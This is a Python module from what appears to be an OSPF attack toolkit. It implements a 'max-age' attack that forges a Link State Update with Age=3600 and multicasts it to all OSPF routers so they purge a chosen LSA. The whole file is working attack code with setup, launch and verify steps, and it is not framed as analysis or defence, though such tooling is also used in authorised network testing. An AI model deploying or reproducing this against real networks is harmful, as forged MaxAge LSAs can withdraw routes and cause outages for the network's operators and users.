from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import LSAConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class MaxAgeAttack(BaseAttack):
    name = "max-age"
    description = "注入 Age=3600 的 LSU 迫使目标清除 LSA"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)
        lsa = build_lsa_header(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=self.config.sequence_number, age=3600,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id, area_id=self.config.area_id,
            src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
        )
        pkt = pkt / lsa
        ok = self._sender.send_raw(pkt)
        return AttackResult(success=ok, packets_sent=self._sender.sent_count,
                           target_affected=False, details="Max-Age 攻击: Age=3600")

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
